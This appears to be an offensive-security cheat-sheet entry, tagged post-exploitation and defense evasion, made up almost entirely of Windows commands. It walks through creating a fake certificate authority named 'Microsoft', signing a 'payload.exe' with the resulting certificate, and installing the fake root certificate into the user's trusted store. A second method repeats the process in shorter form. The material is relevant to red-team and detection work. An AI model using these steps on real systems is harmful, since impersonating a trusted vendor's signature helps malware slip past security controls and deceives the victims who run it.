---
author(s):
  - Userware
tags:
  - post-exploitation
  - defense-evasion
  - living-off-the-land
  - T1553-002
  - windows
---
# Sysinternals

## First Method

Generate a authority certificate `certutil.exe`.

```
C:\> makecert.exe -r -pe -n "CN=Microsoft" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv MicrosoftCA.pvk MicrosoftCA.cer
```

Create `.pfx` from the certificate.

```
C:\> makecert.exe -pe -n "CN=Microsoft Cert" -a sha256 -cy end -sky signature -ic MicrosoftCA.cer -iv MicrosoftCA.pvk -sv MicrosoftCert.pvk MicrosoftCert.cer

C:\> pvk2pfx.exe -pvk MicrosoftCert.pvk -spc MicrosoftCert.cer -pfx MicrosoftCert.pfx
```

Sign the binary payload with a certificate.

> [!INFO]
> You can run this in `wine` through Linux.

```
C:\> signtool.exe sign /v /f MicrosoftCert.pfx /t http://timestamp.digicert.com/?alg=sha1 payload.exe

C:\> signtool.exe sign /fd sha256 /a /tr http://timestamp.digicert.com .\payload.exe
```

Then install the root certificate (this is optional).

```
C:\> certutil.exe -user -addstore Root MicrosoftCA.cer

PS C:\> Import-Certificate -FilePath MicrosoftCA.cer -CertStoreLocation Cert:\CurrentUser\Root\
```

## Second Method

```
C:\> makecert.exe /r /h 0 /eku "1.3.6.1.5.5.7.3.3,1.3.6.1.4.1.311.10.3.13" /e 12/12/2025 /sv m8.pvk m8.cer

C:\> pvk2pfx.exe /pvk m8.pvk /spc m8.cer /pfx m8.pfx

C:\> signtool.exe sign /a /fd SHA256 /f m8.pfx .\payload.exe
```

---
## References

### Source Repository

- [LazySign](https://github.com/jfmaes/LazySign)

### Microsoft

- [Microsoft: Windows SDK](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/)

### m8sec

- [m8sec: Pythonic Malware - Evading Detection with Compiled Executables](https://infosecwriteups.com/pythonic-malware-evading-detection-with-compiled-executables-20194ab0719c)